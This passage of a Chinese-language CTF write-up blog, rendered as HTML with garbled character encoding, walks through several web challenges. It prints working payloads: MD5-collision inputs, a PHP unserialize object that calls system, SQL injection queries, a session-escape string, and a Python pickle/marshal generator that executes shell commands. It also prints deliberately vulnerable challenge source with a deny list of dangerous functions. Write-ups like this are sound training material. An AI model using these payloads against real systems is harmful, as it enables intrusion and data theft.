class=\"hljs-keyword\">echo</span>(<span class=\"hljs-string\">&quot;forbid ~&quot;</span>);<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class=\"hljs-keyword\">else</span> &#123;<br>    <span class=\"hljs-keyword\">if</span> ((<span class=\"hljs-keyword\">string</span>)<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;a&#x27;</span>] !== (<span class=\"hljs-keyword\">string</span>)<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;a&#x27;</span>]) === md5(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;b&#x27;</span>])) &#123;<br>        <span class=\"hljs-keyword\">echo</span> `<span class=\"hljs-variable\">$cmd</span>`;<br>    &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>        <span class=\"hljs-keyword\">echo</span> (<span class=\"hljs-string\">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class=\"hljs-meta\">?&gt;</span><br>&lt;html&gt;<br>&lt;style&gt;<br>  body&#123;<br>   background:url(./bj.png)  no-repeat center center;<br>   background-size:cover;<br>   background-attachment:fixed;<br>   background-color:<span class=\"hljs-comment\">#CCCCCC;</span><br>&#125;<br>&lt;/style&gt;<br>&lt;body&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure></li>\n<li><p>å…¶ä¸­<code>if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))</code>åˆ©ç”¨payload</p>\n<figure class=\"highlight llvm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs llvm\">a<span class=\"hljs-operator\">=</span><span class=\"hljs-variable\">%4</span>d<span class=\"hljs-variable\">%c9</span><span class=\"hljs-variable\">%68</span><span class=\"hljs-variable\">%ff</span><span class=\"hljs-variable\">%0</span>e<span class=\"hljs-variable\">%e3</span><span class=\"hljs-variable\">%5</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%95</span><span class=\"hljs-variable\">%72</span><span class=\"hljs-variable\">%d4</span><span class=\"hljs-variable\">%77</span><span class=\"hljs-variable\">%7</span>b<span class=\"hljs-variable\">%72</span><span class=\"hljs-variable\">%15</span><span class=\"hljs-variable\">%87</span><span class=\"hljs-variable\">%d3</span><span class=\"hljs-variable\">%6</span>f<span class=\"hljs-variable\">%a7</span><span class=\"hljs-variable\">%b2</span><span class=\"hljs-variable\">%1</span>b<span class=\"hljs-variable\">%dc</span><span class=\"hljs-variable\">%56</span><span class=\"hljs-variable\">%b7</span><span class=\"hljs-variable\">%4</span>a<span class=\"hljs-variable\">%3</span>d<span class=\"hljs-variable\">%c0</span><span class=\"hljs-variable\">%78</span><span class=\"hljs-variable\">%3</span>e<span class=\"hljs-variable\">%7</span>b<span class=\"hljs-variable\">%95</span><span class=\"hljs-variable\">%18</span><span class=\"hljs-variable\">%af</span><span class=\"hljs-variable\">%bf</span><span class=\"hljs-variable\">%a2</span><span class=\"hljs-variable\">%00</span><span class=\"hljs-variable\">%a8</span><span class=\"hljs-variable\">%28</span><span class=\"hljs-variable\">%4</span>b<span class=\"hljs-variable\">%f3</span><span class=\"hljs-variable\">%6</span>e<span class=\"hljs-variable\">%8</span>e<span class=\"hljs-variable\">%4</span>b<span class=\"hljs-variable\">%55</span><span class=\"hljs-variable\">%b3</span><span class=\"hljs-variable\">%5</span>f<span class=\"hljs-variable\">%42</span><span class=\"hljs-variable\">%75</span><span class=\"hljs-variable\">%93</span><span class=\"hljs-variable\">%d8</span><span class=\"hljs-variable\">%49</span><span class=\"hljs-variable\">%67</span><span class=\"hljs-variable\">%6</span>d<span class=\"hljs-variable\">%a0</span><span class=\"hljs-variable\">%d1</span><span class=\"hljs-variable\">%55</span><span class=\"hljs-variable\">%5</span>d<span class=\"hljs-variable\">%83</span><span class=\"hljs-variable\">%60</span><span class=\"hljs-variable\">%fb</span><span class=\"hljs-variable\">%5</span>f<span class=\"hljs-variable\">%07</span><span class=\"hljs-variable\">%fe</span><span class=\"hljs-variable\">%a2</span>&amp;b<span class=\"hljs-operator\">=</span><span class=\"hljs-variable\">%4</span>d<span class=\"hljs-variable\">%c9</span><span class=\"hljs-variable\">%68</span><span class=\"hljs-variable\">%ff</span><span class=\"hljs-variable\">%0</span>e<span class=\"hljs-variable\">%e3</span><span class=\"hljs-variable\">%5</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%95</span><span class=\"hljs-variable\">%72</span><span class=\"hljs-variable\">%d4</span><span class=\"hljs-variable\">%77</span><span class=\"hljs-variable\">%7</span>b<span class=\"hljs-variable\">%72</span><span class=\"hljs-variable\">%15</span><span class=\"hljs-variable\">%87</span><span class=\"hljs-variable\">%d3</span><span class=\"hljs-variable\">%6</span>f<span class=\"hljs-variable\">%a7</span><span class=\"hljs-variable\">%b2</span><span class=\"hljs-variable\">%1</span>b<span class=\"hljs-variable\">%dc</span><span class=\"hljs-variable\">%56</span><span class=\"hljs-variable\">%b7</span><span class=\"hljs-variable\">%4</span>a<span class=\"hljs-variable\">%3</span>d<span class=\"hljs-variable\">%c0</span><span class=\"hljs-variable\">%78</span><span class=\"hljs-variable\">%3</span>e<span class=\"hljs-variable\">%7</span>b<span class=\"hljs-variable\">%95</span><span class=\"hljs-variable\">%18</span><span class=\"hljs-variable\">%af</span><span class=\"hljs-variable\">%bf</span><span class=\"hljs-variable\">%a2</span><span class=\"hljs-variable\">%02</span><span class=\"hljs-variable\">%a8</span><span class=\"hljs-variable\">%28</span><span class=\"hljs-variable\">%4</span>b<span class=\"hljs-variable\">%f3</span><span class=\"hljs-variable\">%6</span>e<span class=\"hljs-variable\">%8</span>e<span class=\"hljs-variable\">%4</span>b<span class=\"hljs-variable\">%55</span><span class=\"hljs-variable\">%b3</span><span class=\"hljs-variable\">%5</span>f<span class=\"hljs-variable\">%42</span><span class=\"hljs-variable\">%75</span><span class=\"hljs-variable\">%93</span><span class=\"hljs-variable\">%d8</span><span class=\"hljs-variable\">%49</span><span class=\"hljs-variable\">%67</span><span class=\"hljs-variable\">%6</span>d<span class=\"hljs-variable\">%a0</span><span class=\"hljs-variable\">%d1</span><span class=\"hljs-variable\">%d5</span><span class=\"hljs-variable\">%5</span>d<span class=\"hljs-variable\">%83</span><span class=\"hljs-variable\">%60</span><span class=\"hljs-variable\">%fb</span><span class=\"hljs-variable\">%5</span>f<span class=\"hljs-variable\">%07</span><span class=\"hljs-variable\">%fe</span><span class=\"hljs-variable\">%a2</span><br></code></pre></td></tr></table></figure>\n\n<p>æ¥ç»•è¿‡</p>\n</li>\n<li><p>$cmdè¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œç›´æ¥<code>ca\\t+/flag</code>ç»•è¿‡æ‹¿åˆ°flag</p>\n</li>\n</ol>\n<h2 id=\"ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb\"><a href=\"#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb\" class=\"headerlink\" title=\"[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb\"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><ol>\n<li><p>æŸ¥çœ‹æºä»£ç å‘ç°æœ‰éšè—è¡¨å•ï¼Œå‘é€dataå’Œæ—¶é—´ï¼Œå¯èƒ½å­˜åœ¨å‘½ä»¤æ‰§è¡Œ</p>\n</li>\n<li><p>evalã€systemç­‰å‡½æ•°ä¼šè¢«æ£€æµ‹ï¼Œäºæ˜¯å…ˆfile_get_contentsè¯»ä¸€ä¸‹index.php:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"> <span class=\"hljs-meta\">&lt;?php</span><br>    <span class=\"hljs-variable\">$disable_fun</span> = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">&quot;exec&quot;</span>,<span class=\"hljs-string\">&quot;shell_exec&quot;</span>,<span class=\"hljs-string\">&quot;system&quot;</span>,<span class=\"hljs-string\">&quot;passthru&quot;</span>,<span class=\"hljs-string\">&quot;proc_open&quot;</span>,<span class=\"hljs-string\">&quot;show_source&quot;</span>,<span class=\"hljs-string\">&quot;phpinfo&quot;</span>,<span class=\"hljs-string\">&quot;popen&quot;</span>,<span class=\"hljs-string\">&quot;dl&quot;</span>,<span class=\"hljs-string\">&quot;eval&quot;</span>,<span class=\"hljs-string\">&quot;proc_terminate&quot;</span>,<span class=\"hljs-string\">&quot;touch&quot;</span>,<span class=\"hljs-string\">&quot;escapeshellcmd&quot;</span>,<span class=\"hljs-string\">&quot;escapeshellarg&quot;</span>,<span class=\"hljs-string\">&quot;assert&quot;</span>,<span class=\"hljs-string\">&quot;substr_replace&quot;</span>,<span class=\"hljs-string\">&quot;call_user_func_array&quot;</span>,<span class=\"hljs-string\">&quot;call_user_func&quot;</span>,<span class=\"hljs-string\">&quot;array_filter&quot;</span>, <span class=\"hljs-string\">&quot;array_walk&quot;</span>,  <span class=\"hljs-string\">&quot;array_map&quot;</span>,<span class=\"hljs-string\">&quot;registregister_shutdown_function&quot;</span>,<span class=\"hljs-string\">&quot;register_tick_function&quot;</span>,<span class=\"hljs-string\">&quot;filter_var&quot;</span>, <span class=\"hljs-string\">&quot;filter_var_array&quot;</span>, <span class=\"hljs-string\">&quot;uasort&quot;</span>, <span class=\"hljs-string\">&quot;uksort&quot;</span>, <span class=\"hljs-string\">&quot;array_reduce&quot;</span>,<span class=\"hljs-string\">&quot;array_walk&quot;</span>, <span class=\"hljs-string\">&quot;array_walk_recursive&quot;</span>,<span class=\"hljs-string\">&quot;pcntl_exec&quot;</span>,<span class=\"hljs-string\">&quot;fopen&quot;</span>,<span class=\"hljs-string\">&quot;fwrite&quot;</span>,<span class=\"hljs-string\">&quot;file_put_contents&quot;</span>);<br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gettime</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$func</span>, <span class=\"hljs-variable\">$p</span></span>) </span>&#123;<br>        <span class=\"hljs-variable\">$result</span> = call_user_func(<span class=\"hljs-variable\">$func</span>, <span class=\"hljs-variable\">$p</span>);<br>        <span class=\"hljs-variable\">$a</span>= gettype(<span class=\"hljs-variable\">$result</span>);<br>        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$a</span> == <span class=\"hljs-string\">&quot;string&quot;</span>) &#123;<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$result</span>;<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&quot;&quot;</span>;&#125;<br>    &#125;<br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Test</span> </span>&#123;<br>        <span class=\"hljs-keyword\">var</span> <span class=\"hljs-variable\">$p</span> = <span class=\"hljs-string\">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class=\"hljs-keyword\">var</span> <span class=\"hljs-variable\">$func</span> = <span class=\"hljs-string\">&quot;date&quot;</span>;<br>        <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">$this</span>-&gt;func != <span class=\"hljs-string\">&quot;&quot;</span>) &#123;<br>                <span class=\"hljs-keyword\">echo</span> gettime(<span class=\"hljs-keyword\">$this</span>-&gt;func, <span class=\"hljs-keyword\">$this</span>-&gt;p);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class=\"hljs-variable\">$func</span> = <span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&quot;func&quot;</span>];<br>    <span class=\"hljs-variable\">$p</span> = <span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&quot;p&quot;</span>];<br><br>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$func</span> != <span class=\"hljs-literal\">null</span>) &#123;<br>        <span class=\"hljs-variable\">$func</span> = strtolower(<span class=\"hljs-variable\">$func</span>);<br>        <span class=\"hljs-keyword\">if</span> (!in_array(<span class=\"hljs-variable\">$func</span>,<span class=\"hljs-variable\">$disable_fun</span>)) &#123;<br>            <span class=\"hljs-keyword\">echo</span> gettime(<span class=\"hljs-variable\">$func</span>, <span class=\"hljs-variable\">$p</span>);<br>        &#125;<span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;Hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure></li>\n<li><p>å¯ä»¥çœ‹åˆ°ç¦ç”¨äº†ä¸€äº›å±é™©å‡½æ•°ï¼Œä½†æ˜¯é‡Œé¢æœ‰ä¸€ä¸ªTestç±»ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œè€Œä¸”unserializeæ²¡æœ‰è¢«ç¦ç”¨ï¼Œå°±å¯ä»¥æ„é€ ååºåˆ—åŒ–æ¥å®ç°å‘½ä»¤æ‰§è¡Œã€‚</p>\n</li>\n<li><p>payloadï¼š<code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code>æ‹¿åˆ°flag</p>\n</li>\n</ol>\n<h2 id=\"BJDCTF2020-Cookie-is-so-stable\"><a href=\"#BJDCTF2020-Cookie-is-so-stable\" class=\"headerlink\" title=\"[BJDCTF2020]Cookie is so stable\"></a>[BJDCTF2020]Cookie is so stable</h2><ol>\n<li>æç¤ºcookieï¼Œå‘ç°åœ¨flagè¾“å…¥idåcookieæœ‰ä¸€ä¸ªuserå­—æ®µå­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼Œæµ‹è¯•4æ˜¾ç¤ºHello 4</li>\n<li>å‘ç°å­˜åœ¨è¿‡æ»¤ï¼Œè¿‡æ»¤äº†:<code>()ã€&#39;&#39;ã€$</code></li>\n<li>ç›´æ¥ç”¨Twigçš„payloadç›´æ¥cat flag</li>\n</ol>\n<h2 id=\"SWPU2019-Web1\"><a href=\"#SWPU2019-Web1\" class=\"headerlink\" title=\"[SWPU2019]Web1\"></a>[SWPU2019]Web1</h2><ol>\n<li><p>åœ¨å¹¿å‘Šåå¤„æœ‰è¿‡æ»¤ï¼Œå¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹</p>\n</li>\n<li><p>æµ‹è¯•<code>&#39;</code>ç„¶åç‚¹å¹¿å‘Šè¯¦æƒ…ä¼šåŒ…é”™ï¼Œå­˜åœ¨æ³¨å…¥ç‚¹</p>\n</li>\n<li><p>æµ‹è¯•å­—æ®µæ•°ï¼Œä¸§å¿ƒç—…ç‹‚çš„æœ‰22ä¸ªå­—æ®µæ•°ã€‚ã€‚ã€‚ã€‚</p>\n</li>\n<li><p>ç©ºæ ¼ç”¨<code>/**/</code>ç»•è¿‡ï¼Œ(select/**/version())çœ‹åˆ°æ˜¯MariaDB</p>\n</li>\n<li><p><a href=\"https://blog.zeddyu.info/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/\">https://blog.zeddyu.info/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/</a></p>\n</li>\n<li><p><code>select distinct(table_name) from mysql.innodb_index_stats</code>æ‹¿åˆ°è¡¨å</p>\n</li>\n<li><p>è¿‡æ»¤äº†or    æ— åˆ—åæ³¨å…¥</p>\n</li>\n<li><p><code>select group_concat(b) from (select 1,2,3 as b union select * from users)a</code>æ‹¿flag</p>\n</li>\n</ol>\n<h2 id=\"å®‰æ´µæ¯-2019-easy-serialize-php\"><a href=\"#å®‰æ´µæ¯-2019-easy-serialize-php\" class=\"headerlink\" title=\"[å®‰æ´µæ¯ 2019]easy_serialize_php\"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h2><ol>\n<li><p>ç»™å‡ºæºç ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"> <span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-variable\">$function</span> = @<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;f&#x27;</span>];<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">filter</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$img</span></span>)</span>&#123;<br>    <span class=\"hljs-variable\">$filter_arr</span> = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">&#x27;php&#x27;</span>,<span class=\"hljs-string\">&#x27;flag&#x27;</span>,<span class=\"hljs-string\">&#x27;php5&#x27;</span>,<span class=\"hljs-string\">&#x27;php4&#x27;</span>,<span class=\"hljs-string\">&#x27;fl1g&#x27;</span>);<br>    <span class=\"hljs-variable\">$filter</span> = <span class=\"hljs-string\">&#x27;/&#x27;</span>.implode(<span class=\"hljs-string\">&#x27;|&#x27;</span>,<span class=\"hljs-variable\">$filter_arr</span>).<span class=\"hljs-string\">&#x27;/i&#x27;</span>;<br>    <span class=\"hljs-keyword\">return</span> preg_replace(<span class=\"hljs-variable\">$filter</span>,<span class=\"hljs-string\">&#x27;&#x27;</span>,<span class=\"hljs-variable\">$img</span>);<br>&#125;<br><br><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$_SESSION</span>)&#123;<br>    <span class=\"hljs-keyword\">unset</span>(<span class=\"hljs-variable\">$_SESSION</span>);<br>&#125;<br><br><span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-string\">&quot;user&quot;</span>] = <span class=\"hljs-string\">&#x27;guest&#x27;</span>;<br><span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-string\">&#x27;function&#x27;</span>] = <span class=\"hljs-variable\">$function</span>;<br><br>extract(<span class=\"hljs-variable\">$_POST</span>);<br><br><span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-variable\">$function</span>)&#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;img_path&#x27;</span>])&#123;<br>    <span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-string\">&#x27;img&#x27;</span>] = base64_encode(<span class=\"hljs-string\">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>    <span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-string\">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;img_path&#x27;</span>]));<br>&#125;<br><br><span class=\"hljs-variable\">$serialize_info</span> = filter(serialize(<span class=\"hljs-variable\">$_SESSION</span>));<br><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$function</span> == <span class=\"hljs-string\">&#x27;highlight_file&#x27;</span>)&#123;<br>    highlight_file(<span class=\"hljs-string\">&#x27;index.php&#x27;</span>);<br>&#125;<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$function</span> == <span class=\"hljs-string\">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-string\">&#x27;phpinfo();&#x27;</span>); <span class=\"hljs-comment\">//maybe you can find something in here!</span><br>&#125;<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$function</span> == <span class=\"hljs-string\">&#x27;show_image&#x27;</span>)&#123;<br>    <span class=\"hljs-variable\">$userinfo</span> = unserialize(<span class=\"hljs-variable\">$serialize_info</span>);<br>    <span class=\"hljs-keyword\">echo</span> file_get_contents(base64_decode(<span class=\"hljs-variable\">$userinfo</span>[<span class=\"hljs-string\">&#x27;img&#x27;</span>]));<br>&#125; <br></code></pre></td></tr></table></figure></li>\n<li><p>ç»™å‡ºäº†phpinfoå¹¶ä¸”æç¤ºé‡Œé¢æœ‰å†…å®¹ï¼Œçœ‹åˆ°<code>d0g3_f1ag.php</code></p>\n</li>\n<li><p>çœ‹åˆ°ååºåˆ—åŒ–sessionï¼Œç›²çŒœåº”è¯¥æ˜¯session.upload_progressçš„é¢˜ç›®ï¼Œç„¶åfilterå‡½æ•°åº”è¯¥æ˜¯æ˜¯åˆ©ç”¨å­—ç¬¦é€ƒé€¸</p>\n</li>\n<li><p>æœ‰ä¸€ä¸ª<code>extract($_POST);</code>ï¼Œå½“æˆ‘ä»¬POSTä¸€ä¸ª_SESSIONå˜é‡ä¹‹åï¼Œå°±ä¼šè¦†ç›–SESSIONï¼Œè¿™é‡Œå°±æ˜¯å¯æ§ç‚¹</p>\n</li>\n<li><p>æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•å­—ç¬¦é€ƒé€¸ã€‚æˆ‘ä»¬éœ€è¦æ„é€ å‡ºæ¥çš„sessionæ˜¯</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">_SESSION</span>[user]=<br><span class=\"hljs-attribute\">flagphpphpflagphp</span>&amp;_SESSION[exp]=;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">&quot;img&quot;</span>;s:<span class=\"hljs-number\">20</span>:<span class=\"hljs-string\">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">&quot;exp&quot;</span>;s:<span class=\"hljs-number\">2</span>:<span class=\"hljs-string\">&quot;a&quot;</span>&amp;_SESSION[function]=flagflagflagflagflagflagflagflagphpphp<br></code></pre></td></tr></table></figure></li>\n<li><p>æ‹¿åˆ°d0g3_f1ag.phpæºç ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-variable\">$flag</span> = <span class=\"hljs-string\">&#x27;flag in /d0g3_fllllllag&#x27;</span>;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure></li>\n<li><p>å‘ç°æ–‡ä»¶åç»è¿‡base64ç¼–ç åé•¿åº¦ä¸å˜ï¼Œæ”¹ä¸€ä¸‹å°±å¥½ï¼Œæ‹¿åˆ°flag</p>\n</li>\n</ol>\n<h2 id=\"å®‰æ´µæ¯-2019-easy-serialize-php-1\"><a href=\"#å®‰æ´µæ¯-2019-easy-serialize-php-1\" class=\"headerlink\" title=\"[å®‰æ´µæ¯ 2019]easy_serialize_php\"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h2><ol>\n<li><p>æç¤ºæ‰¾åˆ°â€lv6â€ï¼Œç”¨è„šæœ¬è·‘ï¼Œåœ¨ç¬¬181é¡µ</p>\n</li>\n<li><p>ä¹°ä¸èµ·ï¼Œæ”¹æŠ˜æ‰£ï¼Œæç¤º<code>b1g_m4mber</code></p>\n</li>\n<li><p>æç¤ºåªèƒ½adminè®¿é—®ï¼Œæœ‰JWT</p>\n</li>\n<li><p><a href=\"https://github.com/brendan-rius/c-jwt-cracker\">https://github.com/brendan-rius/c-jwt-cracker</a>  ç”¨è¿™ä¸ªå·¥å…·è·‘   å¯†é’¥æ˜¯<code>1Kun</code></p>\n</li>\n<li><p>ç”¨<a href=\"https://jwt.io/#encoded-jwt%E4%BF%AE%E6%94%B9%EF%BC%8C%E6%8B%BF%E5%88%B0%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84JWT%EF%BC%8C%E8%AE%BF%E9%97%AE%E6%8B%BF%E5%88%B0%E6%8F%90%E7%A4%BA%60/static/asd1f654e683wq/www.zip%60\">https://jwt.io/#encoded-jwtä¿®æ”¹ï¼Œæ‹¿åˆ°ä¿®æ”¹åçš„JWTï¼Œè®¿é—®æ‹¿åˆ°æç¤º`/static/asd1f654e683wq/www.zip`</a></p>\n</li>\n<li><p>æºç ä¸­Admin.pyæœ‰ä¸€ä¸ªpickleè§¦å‘ç‚¹</p>\n</li>\n<li><p>payloadï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> marshal<br><span class=\"hljs-keyword\">import</span> base64<br><span class=\"hljs-keyword\">import</span> urllib<br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">foo</span>():</span><br>    <span class=\"hljs-keyword\">import</span> commands<br>    output = commands.getstatusoutput(<span class=\"hljs-string\">&#x27;cat /flag.txt&#x27;</span>)<br>    <span class=\"hljs-keyword\">return</span> output<br><br>payload = <span class=\"hljs-string\">&quot;&quot;&quot;ctypes</span><br><span class=\"hljs-string\">FunctionType</span><br><span class=\"hljs-string\">(cmarshal</span><br><span class=\"hljs-string\">loads</span><br><span class=\"hljs-string\">(cbase64</span><br><span class=\"hljs-string\">b64decode</span><br><span class=\"hljs-string\">(S&#x27;%s&#x27;</span><br><span class=\"hljs-string\">tRtRc__builtin__</span><br><span class=\"hljs-string\">globals</span><br><span class=\"hljs-string\">(tRS&#x27;&#x27;</span><br><span class=\"hljs-string\">tR(tR.&quot;&quot;&quot;</span> % base64.b64encode(marshal.dumps(foo.func_code))<br><br><br>payload = urllib.quote(payload)<br><span class=\"hljs-built_in\">print</span> payload<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">ç½‘ä¸Šç‰ˆæœ¬<br><br><span class=\"hljs-keyword\">import</span> pickle<br><span class=\"hljs-keyword\">import</span> 